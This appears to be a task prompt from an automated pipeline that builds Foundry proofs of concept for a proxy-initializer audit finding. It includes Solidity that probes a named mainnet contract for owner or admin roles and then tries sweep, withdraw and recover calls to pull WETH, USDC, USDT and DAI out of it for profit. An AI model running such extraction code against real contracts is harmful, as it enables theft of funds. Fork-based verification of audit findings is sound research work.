You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Deployment-time initializer runs before proxy admin is set, enabling privilege capture by the deployer or factory
- claim: `AdminUpgradeabilityProxy` invokes the base `UpgradeabilityProxy` constructor first, and that constructor immediately `delegatecall`s `_data` into the implementation before `_setAdmin(_admin)` runs. Any initializer that derives ownership or privileged roles from `msg.sender` will therefore assign them to the deploying EOA/factory rather than to the intended proxy admin.
- impact: A malicious or compromised deployer/factory can come out of deployment holding the proxied system's privileged roles, allowing theft, governance capture, hostile reconfiguration, or permanent denial of administrative recovery even though a different `_admin` address was supplied.
- exploit_paths: ["A factory or deployer creates `AdminUpgradeabilityProxy` with non-empty initialization calldata.", "The implementation initializer uses a common pattern such as `owner = msg.sender` or granting an admin role to `msg.sender`.", "Because the delegatecall executes before `ADMIN_SLOT` is populated, the deployer/factory receives those privileges instead of the intended admin."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

contract FlawVerifier {
    address public constant TARGET = 0xb5599f568D3f3e6113B286d010d2BCa40A7745AA;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;
    bool private _hypothesisValidated;
    address private _observedPrivilegedHolder;
    string private _exploitPathUsed;
    string private _status;

    constructor() {
        _exploitPathUsed = "historical deployment-time initializer privilege capture by original deployer or factory";
        _status = "not executed";
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        // Path stage 1 is fixed in history for the already-deployed target:
        // the proxy constructor delegatecall ran when 0xb559... was created.
        // On a fork rooted at block 16542147, this verifier cannot become the
        // historical deployer/factory of that existing address.
        //
        // Path stage 2 can only be exploited now if the verifier address already
        // holds the privileged role that the initializer assigned to msg.sender.
        // We probe common ownership/admin read patterns through the proxy.
        if (!_verifierControlsAnyExposedPrivilege()) {
            _hypothesisValidated = false;
            _status =
                "infeasible on this fork: deployment-time role capture already happened before the fork and the verifier does not hold any exposed captured privilege";
            return;
        }

        // If an exposed privileged role unexpectedly resolves to this verifier,
        // attempt only minimal direct owner/admin-style sweep paths that preserve
        // the same causality: already-held privileged rights are used to extract
        // value. No unrelated attack route is introduced.
        _hypothesisValidated = true;
        _status = "verifier appears privileged; attempting direct privileged sweeps";

        _attemptSweep("sweep(address)", WETH);
        _attemptSweep("sweep(address)", USDC);
        _attemptSweep("sweep(address)", USDT);
        _attemptSweep("sweep(address)", DAI);

        _attemptSweep("withdraw(address)", WETH);
        _attemptSweep("withdraw(address)", USDC);
        _attemptSweep("withdraw(address)", USDT);
        _attemptSweep("withdraw(address)", DAI);

        _attemptSweepTo("sweep(address,address)", WETH);
        _attemptSweepTo("sweep(address,address)", USDC);
        _attemptSweepTo("sweep(address,address)", USDT);
        _attemptSweepTo("sweep(address,address)", DAI);

        _attemptRecover("recoverERC20(address,uint256)", WETH);
        _attemptRecover("recoverERC20(address,uint256)", USDC);
        _attemptRecover("recoverERC20(address,uint256)", USDT);
        _attemptRecover("recoverERC20(address,uint256)", DAI);

        _attemptRecoverTo("recoverERC20(address,address,uint256)", WETH);
        _attemptRecoverTo("recoverERC20(address,address,uint256)", USDC);
        _attemptRecoverTo("recoverERC20(address,address,uint256)", USDT);
        _attemptRecoverTo("recoverERC20(address,address,uint256)", DAI);

        _attemptRecoverTo("rescueTokens(address,address,uint256)", WETH);
        _attemptRecoverTo("rescueTokens(address,address,uint256)", USDC);
        _attemptRecoverTo("rescueTokens(address,address,uint256)", USDT);
        _attemptRecoverTo("rescueTokens(address,address,uint256)", DAI);

        _attemptRecoverTo("recover(address,address,uint256)", WETH);
        _attemptRecoverTo("recover(address,address,uint256)", USDC);
        _attemptRecoverTo("recover(address,address,uint256)", USDT);
        _attemptRecoverTo("recover(address,address,uint256)", DAI);

        if (_profitAmount == 0) {
            _status =
                "exposed privilege probed to verifier, but no token-bearing privileged sweep function was executable";
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external view returns (string memory) {
        return _exploitPathUsed;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function observedPrivilegedHolder() external view returns (address) {
        return _observedPrivilegedHolder;
    }

    function status() external view returns (string memory) {
        return _status;
    }

    function _verifierControlsAnyExposedPrivilege() internal returns (bool) {
        if (_probeHasRole(bytes32(0), address(this))) {
            _observedPrivilegedHolder = address(this);
            return true;
        }

        address holder = _probeAddress("owner()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("admin()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("governance()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("gov()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("controller()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("operator()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("manager()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("guardian()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("strategist()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("keeper()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        holder = _probeAddress("executor()");
        if (holder != address(0)) {
            _observedPrivilegedHolder = holder;
            if (holder == address(this)) {
                return true;
            }
        }

        return false;
    }

    function _probeHasRole(bytes32 role, address account) internal view returns (bool) {
        (bool ok, bytes memory data) =
            TARGET.staticcall(abi.encodeWithSignature("hasRole(bytes32,address)", role, account));
        return ok && data.length >= 32 && abi.decode(data, (bool));
    }

    function _probeAddress(string memory signature) internal view returns (address) {
        (bool ok, bytes memory data) = TARGET.staticcall(abi.encodeWithSignature(signature));
        if (!ok || data.length < 32) {
            return address(0);
        }
        uint256 raw = abi.decode(data, (uint256));
        if (raw > type(uint160).max) {
            return address(0);
        }
        // forge-lint: disable-next-line(unsafe-typecast)
        return address(uint160(raw));
    }

    function _attemptSweep(string memory signature, address token) internal {
        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        (bool ok,) = TARGET.call(abi.encodeWithSignature(signature, token));
        if (ok) {
            _recordProfit(token, beforeBal);
        }
    }

    function _attemptSweepTo(string memory signature, address token) internal {
        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        (bool ok,) = TARGET.call(abi.encodeWithSignature(signature, token, address(this)));
        if (ok) {
            _recordProfit(token, beforeBal);
        }
    }

    function _attemptRecover(string memory signature, address token) internal {
        uint256 targetBal = IERC20Like(token).balanceOf(TARGET);
        if (targetBal == 0) {
            return;
        }
        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        (bool ok,) = TARGET.call(abi.encodeWithSignature(signature, token, targetBal));
        if (ok) {
            _recordProfit(token, beforeBal);
        }
    }

    function _attemptRecoverTo(string memory signature, address token) internal {
        uint256 targetBal = IERC20Like(token).balanceOf(TARGET);
        if (targetBal == 0) {
            return;
        }
        uint256 beforeBal = IERC20Like(token).balanceOf(address(this));
        (bool ok,) = TARGET.call(abi.encodeWithSignature(signature, token, address(this), targetBal));
        if (ok) {
            _recordProfit(token, beforeBal);
        }
    }

    function _recordProfit(address token, uint256 beforeBal) internal {
        uint256 afterBal = IERC20Like(token).balanceOf(address(this));
        if (afterBal <= beforeBal) {
            return;
        }

        uint256 gained = afterBal - beforeBal;
        if (gained > _profitAmount) {
            _profitToken = token;
            _profitAmount = gained;
        }
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: adminupgradeabilityproxy, owner = msg.sender, admin_slot; generated code does not cover paths indexes: 0, 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
